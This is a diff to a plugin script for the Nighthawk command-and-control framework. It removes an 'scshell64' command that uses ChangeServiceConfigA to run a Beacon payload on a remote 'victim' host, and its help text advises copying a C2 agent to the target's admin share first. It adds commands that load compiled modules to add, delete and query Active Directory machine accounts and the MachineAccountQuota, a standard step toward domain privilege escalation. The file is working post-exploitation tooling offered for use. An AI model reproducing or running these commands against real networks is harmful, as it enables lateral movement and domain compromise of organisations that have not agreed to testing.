@@ -910,61 +910,135 @@ THIS IS AN AVANTGUARD SCRIPT""",
 
 
 
-# region BOF - scshell64
+# region BOF - machine account add/del/get
 
-def scshell64(params, info):
-    with open(nighthawk.script_resource(f"SCShell-master/CS-BOF/scshellbof.{info.Agent.ProcessArch}.o"), 'rb') as f:
-        bof = f.read()
+def add_machine_account(params, info):
+    """
+    Add a computer account to the Active Directory domain.
+    """
 
-    # $target, $service, "C:\\ $+ $exepath"
-    target = ""
-    service = ""
-    exepath = ""
-    if len(params) > 2:
-        target = params[0]
-        service = params[1]
-        exepath = params[2]
-    else:
-        nighthawk.console_write(CONSOLE_ERROR, f"!! Usage:   scshell64 <target> <service> <exepath>")
+    if len(params) < 2:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: add_machine_account <computername> <password>")
         return False
 
+    computerName = params[0]
+    password = params[1]
     packer = Packer()
-    packer.addstr(target)
-    packer.addstr(service)
-    packer.addstr(exepath)
+    packer.addstr(computerName)
+    packer.addstr(password)
     packed_params = packer.getbuffer()
 
     if type(packed_params) != bytes:
         return False
 
-    nighthawk.console_write(CONSOLE_INFO, "executing probe BOF")
+    with open(nighthawk.script_resource(f"SA/AddMachineAccount/AddMachineAccount.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing AddMachineAccount BOF")
     api.execute_bof(
-        f"scshellbof.{info.Agent.ProcessArch}.o",
+        f"AddMachineAccount.{info.Agent.ProcessArch}.o",
         bof,
         packed_params,
         "go",
         False,
         0,
         True,
-        "T1569",
+        "",
         show_in_console=True
     )
 
+nighthawk.register_command(
+    add_machine_account,
+    "add-machine-account",
+    "BOF - Add a computer account to the Active Directory domain. (avantguard script)",
+    "BOF - Add a computer account to the Active Directory domain. (avantguard script)",
+    """add_machine_account <computername> <password>
+    Summary: Use Active Directory Service Interfaces (ADSI) to add a computer account to AD.
+    Usage: add_machine_account <computername> <password>
+    
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "add_machine_account MYCOMPUTER$ Passw0rd!"
+)
+
+def del_machine_account(params, info):
+    """
+    Remove a computer account from the Active Directory domain.
+    """
+    if len(params) < 1:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: del_machine_account <computername>")
+        return False
+
+    computerName = params[0]
+    packer = Packer()
+    packer.addstr(computerName)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"SA/DelMachineAccount/DelMachineAccount.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing DelMachineAccount BOF")
+    api.execute_bof(
+        f"DelMachineAccount.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        show_in_console=True
+    )
 
 nighthawk.register_command(
-    scshell64,
-    "scshell64",
-    "BOF - Use ChangeServiceConfigA to run Beacon payload (avantguard script)",
-    "BOF - Use ChangeServiceConfigA to run Beacon payload (avantguard script)",
-    """scshell64 <target> <service> <exepath>
-Summary: Use ChangeServiceConfigA to run Beacon payload.
-Usage:   scshell64 <target> <service> <exepath>
+    del_machine_account,
+    "del-machine-account",
+    "BOF - Remove a computer account from the Active Directory domain. (avantguard script)",
+    "BOF - Remove a computer account from the Active Directory domain. (avantguard script)",
+    """del_machine_account <computername>
+    Summary: Use Active Directory Service Interfaces (ADSI) to delete a computer account from AD.
+    Usage: del_machine_account <computername>
+    
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "del_machine_account MYCOMPUTER$"
+)
 
-Excample: scshell64 myvictim.contoso.com defragsvc C:\Windows\System32\avcssvc.exe
-Hint: Copy a c2-agent to the remote system \\myvictim\C$\Windows\System32\avcsvc.exe before using this command!
+def get_machine_account_quota(params, info):
+    """
+    Read the MachineAccountQuota value from the Active Directory domain.
+    """
+    packer = Packer()
+    packed_params = packer.getbuffer()
 
-THIS IS AN AVANTGUARD SCRIPT""",
-    "scshell64 myvictim.contoso.com defragsvc C:\Windows\System32\avcssvc.exe"
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"SA/GetMachineAccountQuota/GetMachineAccountQuota.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing GetMachineAccountQuota BOF")
+    api.execute_bof(
+        f"GetMachineAccountQuota.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        show_in_console=True
+    )
+
+nighthawk.register_command(
+    get_machine_account_quota,
+    "get-machine-account-quota",
+    "BOF - Read the MachineAccountQuota value from the Active Directory domain. (avantguard script)",
+    "BOF - Read the MachineAccountQuota value from the Active Directory domain. (avantguard script)",
+    """get_machine_account_quota
+    Summary: Use Active Directory Service Interfaces (ADSI) to read the ms-DS-MachineAccountQuota value from AD.
+    Usage: get_add_machine_account_quota
+    
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "get_machine_account_quota"
 )
 
 # endregion
